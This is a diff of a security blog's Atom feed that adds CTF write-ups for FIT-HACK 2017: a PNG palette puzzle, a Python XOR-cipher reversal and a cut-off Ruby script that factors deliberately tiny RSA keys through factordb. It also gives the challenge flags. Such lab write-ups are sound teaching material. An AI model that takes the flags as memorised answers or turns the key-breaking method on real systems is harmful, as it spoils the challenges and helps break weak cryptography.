@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rawsec.ml/"/>
-  <updated>2017-04-09T22:48:39.900Z</updated>
+  <updated>2017-04-15T16:04:37.071Z</updated>
   <id>https://rawsec.ml/</id>
   
   <author>
@@ -14,6 +14,382 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FIT-HACK CTF 2017 - Write-ups</title>
+    <link href="https://rawsec.ml/en/FIT-HACK-2017-write-ups/"/>
+    <id>https://rawsec.ml/en/FIT-HACK-2017-write-ups/</id>
+    <published>2017-04-14T22:00:00.000Z</published>
+    <updated>2017-04-15T16:04:37.071Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : FIT-HACK CTF 2017</li>
+<li><strong>Website</strong> : <a href="https://ctf.nw.fit.ac.jp/" target="_blank" rel="external">ctf.nw.fit.ac.jp</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/451" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="250-color-misc">250 - Color - Misc</h2>
+<blockquote>
+<p>Check the color information.</p>
+<p><a href="https://ctf.nw.fit.ac.jp/files/65178aab3a9035f27ff94b161d445305/image.zip" target="_blank" rel="external">Image.zip</a></p>
+</blockquote>
+<p>So it's a PNG:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file image.png</div><div class="line">image.png: PNG image data, 300 x 300, 8-bit colormap, non-interlaced</div></pre></td></tr></table></figure></p>
+<p>Our PNG has a color palette:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ pnginfo image.png</div><div class="line">image.png...</div><div class="line">  Image Width: 300 Image Length: 300</div><div class="line">  Bitdepth (Bits/Sample): 8</div><div class="line">  Channels (Samples/Pixel): 1</div><div class="line">  Pixel depth (Pixel Depth): 8</div><div class="line">  Colour Type (Photometric Interpretation): PALETTED COLOUR (0 colours, 0 transparent)</div><div class="line">  Image filter: Single row per byte filter</div><div class="line">  Interlacing: No interlacing</div><div class="line">  Compression Scheme: Deflate method 8, 32k window</div><div class="line">  Resolution: 0, 1342587364 (Unknown value for unit stored)</div><div class="line">  FillOrder: msb-to-lsb</div><div class="line">  Byte Order: Network (Big Endian)</div><div class="line">  Number of text strings: 0 of 0</div></pre></td></tr></table></figure></p>
+<p>The PNG seems valid:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ pngcheck image.png</div><div class="line">zlib warning:  different version (expected 1.2.8, using 1.2.11)</div><div class="line"></div><div class="line">OK: image.png (300x300, 8-bit palette+trns, non-interlaced, 90.9%).</div></pre></td></tr></table></figure></p>
+<p>Let's verify and see the chuncks:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$ pngchunks image.png</div><div class="line">Chunk: Data Length 13 (max 2147483647), Type 1380206665 [IHDR]</div><div class="line">  Critical, public, PNG 1.2 compliant, unsafe to copy</div><div class="line">  IHDR Width: 300</div><div class="line">  IHDR Height: 300</div><div class="line">  IHDR Bitdepth: 8</div><div class="line">  IHDR Colortype: 3</div><div class="line">  IHDR Compression: 0</div><div class="line">  IHDR Filter: 0</div><div class="line">  IHDR Interlace: 0</div><div class="line">  IHDR Compression algorithm is Deflate</div><div class="line">  IHDR Filter method is type zero (None, Sub, Up, Average, Paeth)</div><div class="line">  IHDR Interlacing is disabled</div><div class="line">  Chunk CRC: 1319337543</div><div class="line">Chunk: Data Length 8 (max 2147483647), Type 1280598881 [acTL]</div><div class="line">  Ancillary, private, PNG 1.2 compliant, unsafe to copy</div><div class="line">  ... Unknown chunk type</div><div class="line">  Chunk CRC: -1821571854</div><div class="line">Chunk: Data Length 57 (max 2147483647), Type 1163152464 [PLTE]</div><div class="line">  Critical, public, PNG 1.2 compliant, unsafe to copy</div><div class="line">  ... Unknown chunk type</div><div class="line">  Chunk CRC: 1193133337</div><div class="line">Chunk: Data Length 1 (max 2147483647), Type 1397641844 [tRNS]</div><div class="line">  Ancillary, public, PNG 1.2 compliant, unsafe to copy</div><div class="line">  ... Unknown chunk type</div><div class="line">  Chunk CRC: 1088870502</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
+<p>The <code>PLTE</code> (palette) chunck seems corrupted (critical). That's maybe why we got <code>PALETTED COLOUR (0 colours, 0 transparent)</code>.</p>
+<p>A tool can reveal us that our image is an APNG (Animated PNG like GIF) that was created by APNG Assembler 2.9:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Type:    Portable network graphics</div><div class="line">Mode:    ColorMap</div><div class="line"></div><div class="line">Checking Meta Data</div><div class="line"></div><div class="line">Size                     : 300x300</div><div class="line">Bit Depth                : 8</div><div class="line">Color Type               : Color and Palette</div><div class="line">Compression Used         : Deflate</div><div class="line">Filter Method            : Adaptive Filtering</div><div class="line">Interlace Method         : No Interlace</div><div class="line">Palettes                 : 19</div><div class="line">Software                 : APNG Assembler 2.9</div></pre></td></tr></table></figure></p>
+<p>Let's split the chuncks:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ pngsplit image.png</div><div class="line">pngsplit, version 0.60 BETA of 11 February 2007, by Greg Roelofs.</div><div class="line">  This software is licensed under the GNU General Public License.</div><div class="line">  There is NO warranty.</div><div class="line"></div><div class="line">image.png:</div><div class="line"></div><div class="line">$ ls</div><div class="line">image.png            image.png.0004.tRNS  image.png.0009.fcTL  image.png.0014.fdAT  image.png.0019.fcTL  image.png.0024.fdAT  image.png.0029.fcTL  image.png.0034.fdAT  image.png.0039.fcTL</div><div class="line">image.png.0000.sig   image.png.0005.fcTL  image.png.0010.fdAT  image.png.0015.fcTL  image.png.0020.fdAT  image.png.0025.fcTL  image.png.0030.fdAT  image.png.0035.fcTL  image.png.0040.fdAT</div><div class="line">image.png.0001.IHDR  image.png.0006.IDAT  image.png.0011.fcTL  image.png.0016.fdAT  image.png.0021.fcTL  image.png.0026.fdAT  image.png.0031.fcTL  image.png.0036.fdAT  image.png.0041.tEXt</div><div class="line">image.png.0002.acTL  image.png.0007.fcTL  image.png.0012.fdAT  image.png.0017.fcTL  image.png.0022.fdAT  image.png.0027.fcTL  image.png.0032.fdAT  image.png.0037.fcTL  image.png.0042.IEND</div><div class="line">image.png.0003.PLTE  image.png.0008.fdAT  image.png.0013.fcTL  image.png.0018.fdAT  image.png.0023.fcTL  image.png.0028.fdAT  image.png.0033.fcTL  image.png.0038.fdAT</div></pre></td></tr></table></figure></p>
+<p>Now let's see our strange <code>PLTE</code> chunck:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ xxd image.png.0003.PLTE</div><div class="line">00000000: 0000 0039 504c 5445 1212 1246 4954 4772  ...9PLTE...FITGr</div><div class="line">00000010: 615f 4e33 5f50 3062 6c33 6335 5f64 3372  a_N3_P0bl3c5_d3r</div><div class="line">00000020: 6675 6c69 355f 696d 6170 6869 726b 5f72  fuli5_imaphirk_r</div><div class="line">00000030: 7461 7433 6474 7730 7730 6e7b 416e 7d00  tat3dtw0w0n&#123;An&#125;.</div><div class="line">00000040: 0047 1dc5 19                             .G...</div><div class="line"></div><div class="line">$ strings image.png.0003.PLTE</div><div class="line">9PLTE</div><div class="line">FITGra_N3_P0bl3c5_d3rfuli5_imaphirk_rtat3dtw0w0n&#123;An&#125;</div></pre></td></tr></table></figure></p>
+<p>The string looks like the flag but mixed up.</p>
+<p>We can get quite the same conclusion with just a strings on the image:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ strings image.png</div><div class="line">IHDR</div><div class="line">acTL</div><div class="line">9PLTE</div><div class="line">FITGra_N3_P0bl3c5_d3rfuli5_imaphirk_rtat3dtw0w0n&#123;An&#125;</div><div class="line">tRNS</div><div class="line">fcTL</div><div class="line">IDATx</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">fcTL</div><div class="line">fdAT</div><div class="line">tEXtSoftware</div><div class="line">APNG Assembler 2.9&amp;[</div><div class="line">IEND</div></pre></td></tr></table></figure></p>
+<p>I read a lot of stuff about steganography methods that sort palette in a different order to hide a text in the image but didn't find how to do it in practice. And our strings (that looks like the flag) is some plain text, it's not hidden in the image. Maybe the palette was the key or something to re-order the flag.</p>
+<p>But I just did it by hand and guessed that <code>FITGra_N3_P0bl3c5_d3rfuli5_imaphirk_rtat3dtw0w0n{An}</code> have <code>FIT{}</code> + only 4 uppercase letters <code>APNG</code>. What a coincidence! And we have all the (1337) letters to make <code>Animated Portable Network Graphics</code>. With the letters left I can finnaly write: <code>FIT{Animat3d_P0rtabl3_N3tw0rk_Graphic5_i5_w0nd3rful}</code>.</p>
+<p><strong>Note</strong>: That's was not the normal way to solve it but guessable flag are too bad!</p>
+<h2 id="100-simple-cipher-crypto">100 - Simple cipher - Crypto</h2>
+<blockquote>
+<p>I got an encrypted message and a file I used for encryption.
+However I do not know what to do, so I want you to solve it instead.</p>
+</blockquote>
+<p>enc_text.txt = <code>0c157e2b7f7b515e075b391f143200080a00050316322b272e0d525017562e73183e3a0d564f6718</code></p>
+<p>And <a href="http://encryption.py" target="_blank" rel="external">encryption.py</a> looks like:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">mes = <span class="string">"*****secret*****"</span></div><div class="line">key = <span class="string">"J2msBeG8"</span></div><div class="line"></div><div class="line"><span class="comment"># padding with spaces</span></div><div class="line"><span class="keyword">if</span> len(mes) % len(key) != <span class="number">0</span>:</div><div class="line">    n = len(key) - len(mes) % len(key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        mes += <span class="string">" "</span></div><div class="line"></div><div class="line">m = []</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(len(key)):</div><div class="line">    i = a</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(len(mes)/len(key)):</div><div class="line">        m.append(ord(mes[i]) ^ ord(key[a]))</div><div class="line">        i += len(key)</div><div class="line"></div><div class="line">enc_mes = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(m)):</div><div class="line">    enc_mes += <span class="string">"%02x"</span> % m[j]</div><div class="line"></div><div class="line"><span class="keyword">print</span> enc_mes</div></pre></td></tr></table></figure></p>
+<p>It's a non linear xoring.</p>
+<p>Example: message length is 16, key length is 8 (so 2 key loops).</p>
+<p>Normal xoring gives: m[0] ^ k[0], m[1] ^ k[1], m[2] ^ k[2], m[3] ^ k[3], m[4] ^ k[4], m[5] ^ k[5], m[6] ^ k[6], m[7] ^ k[7], m[8] ^ k[0], m[9] ^ k[1], m[10] ^ k[2], m[11] ^ k[3], m[12] ^ k[4], m[13] ^ k[5], m[14] ^ k[6], m[15] ^ k[7]</p>
+<p>The modified xoring gives: m[0] ^ k[0], m[8] ^ k[0], m[1] ^ k[1], m[9] ^ k[1], m[2] ^ k[2], m[10] ^ k[2], m[3] ^ k[3], m[11] ^ k[3], m[4] ^ k[4], m[12] ^ k[4], m[5] ^ k[5], m[13] ^ k[5], m[6] ^ k[6], m[14] ^ k[6], m[7] ^ k[7], m[15] ^ k[7]</p>
+<p>In our case: message length is 40, key length is 8 (so 5 key loops).</p>
+<p>So I wrote the python lines that does exactly the reverse process, we can test with the default message:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">key = <span class="string">"J2msBeG8"</span></div><div class="line">mes = <span class="string">"*****secret*****"</span></div><div class="line"></div><div class="line"><span class="comment"># padding with spaces</span></div><div class="line"><span class="keyword">if</span> len(mes) % len(key) != <span class="number">0</span>:</div><div class="line">    n = len(key) - len(mes) % len(key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        mes += <span class="string">" "</span></div><div class="line"></div><div class="line">m = []</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(len(key)):</div><div class="line">    i = a</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(len(mes)/len(key)):</div><div class="line">        m.append(ord(mes[i]) ^ ord(key[a]))</div><div class="line">        i += len(key)</div><div class="line"></div><div class="line">enc_mes = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(m)):</div><div class="line">    enc_mes += <span class="string">"%02x"</span> % m[j]</div><div class="line"></div><div class="line"><span class="keyword">print</span> enc_mes</div><div class="line"></div><div class="line"><span class="comment">#enc_mes = "0c157e2b7f7b515e075b391f143200080a00050316322b272e0d525017562e73183e3a0d564f6718"</span></div><div class="line"></div><div class="line">enc_mes_splited = [enc_mes[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc_mes), <span class="number">2</span>)]</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(enc_mes_splited)):</div><div class="line">    enc_mes_splited[j] = int(enc_mes_splited[j], <span class="number">16</span>)</div><div class="line"></div><div class="line">m = enc_mes_splited</div><div class="line">mes = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(len(enc_mes_splited)/len(key)):</div><div class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(len(key)):</div><div class="line">        mes += str(chr((m[len(enc_mes_splited)/len(key)*a+b]) ^ ord(key[a])))</div><div class="line"><span class="keyword">print</span> mes</div></pre></td></tr></table></figure></p>
+<p>And we find the original message:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python2 encryption.py</div><div class="line">60381857471959596868164f226d5b12</div><div class="line">*****secret*****</div></pre></td></tr></table></figure></p>
+<p>So now let's replace <code>enc_mess</code> with the challenge value and we find <code>FIT{Thi5_cryp74n4lysi5_wa5_very_5impl3}</code>.</p>
+<h2 id="100-it-s-solvable-crypto">100 - It's_solvable - Crypto</h2>
+<blockquote>
+<p>Easy?</p>
+<p><a href="https://ctf.nw.fit.ac.jp/files/1f24829f38d89d50cb5e90df1e03ecff/Its_solvable.zip" target="_blank" rel="external">File</a></p>
+</blockquote>
+<p>We have multiple public keys, and some encoded texts:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ ls */</div><div class="line">39BCC1930B969051426F5864F24B478CEAFBA7D8/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">59E859397B1AB522AAF698D9D42D5F064FD11381/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">5A6DF720540C20D95D530D3FD6885511223D5D20/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">8090FD368C8382FD4B216C5BAA04C99769DFCC49/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">A1047EAB1035D58682A53557E0B2A75EDBFD15FD/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">C5E31D5915661DE4393E3F1489B00EBC4497DD48/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">C9CF2EF3AD15705851D02C005B381171AF921BD7/:</div><div class="line">fit  fitkey.pem</div></pre></td></tr></table></figure></p>
+<p>The RSA keys seems very weak (about 150 bit), the modulus is very small:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 39BCC1930B969051426F5864F24B478CEAFBA7D8/publicfit.pem</div><div class="line">Public-Key: (153 bit)</div><div class="line">Modulus:</div><div class="line">    01:87:ff:1f:e5:90:c8:97:83:44:d6:16:72:0c:c1:</div><div class="line">    20:a0:ea:71:67</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 59E859397B1AB522AAF698D9D42D5F064FD11381/publicfit.pem</div><div class="line">Public-Key: (148 bit)</div><div class="line">Modulus:</div><div class="line">    0c:12:08:7a:f4:11:24:16:7e:5b:f1:32:5c:04:75:</div><div class="line">    ab:d4:17:0f</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 5A6DF720540C20D95D530D3FD6885511223D5D20/publicfit.pem</div><div class="line">Public-Key: (150 bit)</div><div class="line">Modulus:</div><div class="line">    39:c2:a4:61:db:f6:94:84:a2:30:13:80:b3:98:32:</div><div class="line">    6d:ee:51:d1</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 8090FD368C8382FD4B216C5BAA04C99769DFCC49/publicfit.pem</div><div class="line">Public-Key: (151 bit)</div><div class="line">Modulus:</div><div class="line">    5d:5e:9f:10:7f:b1:38:59:d2:4c:85:77:3e:a4:ff:</div><div class="line">    8b:ef:8e:99</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; A1047EAB1035D58682A53557E0B2A75EDBFD15FD/publicfit.pem</div><div class="line">Public-Key: (149 bit)</div><div class="line">Modulus:</div><div class="line">    1a:ac:d3:c9:0d:1a:bd:fd:dd:de:18:35:f5:8a:88:</div><div class="line">    f0:36:8b:9f</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; C5E31D5915661DE4393E3F1489B00EBC4497DD48/publicfit.pem</div><div class="line">Public-Key: (154 bit)</div><div class="line">Modulus:</div><div class="line">    03:8a:f3:1e:59:8e:24:2b:5f:cf:1b:30:6f:df:f0:</div><div class="line">    e2:d6:6e:f2:39</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; C9CF2EF3AD15705851D02C005B381171AF921BD7/fitkey.pem    </div><div class="line">Public-Key: (151 bit)</div><div class="line">Modulus:</div><div class="line">    65:7a:90:84:26:10:1a:fa:25:51:cf:ca:26:e3:9a:</div><div class="line">    f5:64:53:27</div><div class="line">Exponent: 65537 (0x10001)</div></pre></td></tr></table></figure></p>
+<p>Another way to show the modulus:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ openssl rsa -in 39BCC1930B969051426F5864F24B478CEAFBA7D8/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=187FF1FE590C8978344D616720CC120A0EA7167</div><div class="line"></div><div class="line">$ openssl rsa -in 59E859397B1AB522AAF698D9D42D5F064FD11381/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=C12087AF41124167E5BF1325C0475ABD4170F</div><div class="line"></div><div class="line">$ openssl rsa -in 5A6DF720540C20D95D530D3FD6885511223D5D20/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=39C2A461DBF69484A2301380B398326DEE51D1</div><div class="line"></div><div class="line">$ openssl rsa -in 8090FD368C8382FD4B216C5BAA04C99769DFCC49/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=5D5E9F107FB13859D24C85773EA4FF8BEF8E99</div><div class="line"></div><div class="line">$ openssl rsa -in A1047EAB1035D58682A53557E0B2A75EDBFD15FD/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=1AACD3C90D1ABDFDDDDE1835F58A88F0368B9F</div><div class="line"></div><div class="line">$ openssl rsa -in C5E31D5915661DE4393E3F1489B00EBC4497DD48/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=38AF31E598E242B5FCF1B306FDFF0E2D66EF239</div><div class="line"></div><div class="line">$ openssl rsa -in C9CF2EF3AD15705851D02C005B381171AF921BD7/fitkey.pem -pubin -modulus -noout</div><div class="line">Modulus=657A908426101AFA2551CFCA26E39AF5645327</div></pre></td></tr></table></figure></p>
+<p>We may be able to <a href="http://www.loyalty.org/~schoen/rsa/" target="_blank" rel="external">factorize it</a>.</p>
+<p>I made a ruby script that get the public keys, extract the modulus, get the prime factorization from factordb, and then create the private keys from p and q:</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></div><div class="line"></div><div class="line">key1 = OpenSSL::PKey::RSA.new File.read <span class="string">'39BCC1930B969051426F5864F24B478CEAFBA7D8/publicfit.pem'</span></div><div class="line">key2 = OpenSSL::PKey::RSA.new File.read <span class="string">'59E859397B1AB522AAF698D9D42D5F064FD11381/publicfit.pem'</span></div><div class="line">key3 = OpenSSL::PKey::RSA.new File.read <span class="string">'5A6DF720540C20D95D530D3FD6885511223D5D20/publicfit.pem'</span></div><div class="line">key4 = OpenSSL::PKey::RSA.new File.read <span class="string">'8090FD368C8382FD4B216C5BAA04C99769DFCC49/publicfit.pem'</span></div><div class="line">key5 = OpenSSL::PKey::RSA.new File.read <span class="string">'A1047EAB1035D58682A53557E0B2A75EDBFD15FD/publicfit.pem'</span></div><div class="line">key6 = OpenSSL::PKey::RSA.new File.read <span class="string">'C5E31D5915661DE4393E3F1489B00EBC4497DD48/publicfit.pem'</span></div><div class="line">key7 = OpenSSL::PKey::RSA.new File.read <span class="string">'C9CF2EF3AD15705851D02C005B381171AF921BD7/fitkey.pem'</span></div><div class="line"></div><div class="line">keys = [key1, key2, key3, key4, key5, key6, key7]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask</span><span class="params">(key)</span></span></div><div class="line">    uri = URI(<span class="string">'http://factordb.com/index.php'</span>)</div><div class="line">    params = &#123; <span class="symbol">:query</span> =&gt; key.n.to_s &#125;</div><div class="line">    uri.query = URI.encode_www_form(params)</div><div class="line">    http = Net::HTTP.new(uri.host, uri.port)</div><div class="line">    res = http.get(uri)</div><div class="line">    <span class="keyword">return</span> res.body</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pq</span><span class="params">(key)</span></span></div><div class="line">    n<span class="number">_</span>, p<span class="number">_</span>, q<span class="number">_</span> = ask(key).match(<span class="regexp">/&lt;font color="#002099"&gt;([0-9]*)&lt;\/font&gt;&lt;\/a&gt;&lt;sub&gt;&amp;lt;.*&amp;gt;&lt;\/sub&gt; = &lt;a href=".*"&gt;&lt;font color="#000000"&gt;([0-9]*)&lt;\/font&gt;&lt;\/a&gt;&lt;sub&gt;&amp;lt;.*&amp;gt;&lt;\/sub&gt; &amp;middot; &lt;a href=".*"&gt;&lt;font color="#000000"&gt;([0-9]*)&lt;\/font&gt;/</span>).captures</div><div class="line">    puts <span class="string">"n: <span class="subst">#&#123;n<span class="number">_</span>&#125;</span>"</span></div><div class="line">    puts <span class="string">"p: <span class="subst">#&#123;p<span class="number">_</span>&#125;</span>"</span></div><div class="line">    puts <span class="string">"q: <span class="subst">#&#123;q<span class="number">_</span>&#125;</span>"</span></div><div class="line">    <span class="keyword">return</span> p<span class="number">_</span>, q<span class="number">_</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_key_pem</span><span class="params">(p<span class="number">_</span>,q<span class="number">_</span>,i=<span class="number">0</span>)</span></span></div><div class="line">    <span class="string">`python2 /home/noraj/CTF/tools/rsatool/rsatool.py -f PEM -o /home/noraj/CTF/FIT-HACK/2017/files/key<span class="subst">#&#123;i&#125;</span>.pem -p <span class="subst">#&#123;p<span 